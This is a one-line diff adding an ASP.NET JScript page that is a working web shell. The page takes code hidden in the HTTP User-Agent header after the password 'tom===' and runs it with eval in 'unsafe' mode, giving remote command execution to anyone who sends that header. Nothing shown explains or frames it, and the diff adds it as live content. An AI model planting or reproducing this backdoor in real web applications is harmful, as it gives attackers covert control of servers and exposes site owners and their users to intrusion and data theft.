@@ -1,0 +1,1 @@
+<%@ Page Language="Jscript" %><%var pwd="tom";var uastr=Request.UserAgent;if (uastr.Substring(0, uastr.IndexOf("==="))== pwd) {var code=uastr.Replace(pwd+"===","");eval(code,"unsafe"); };%>
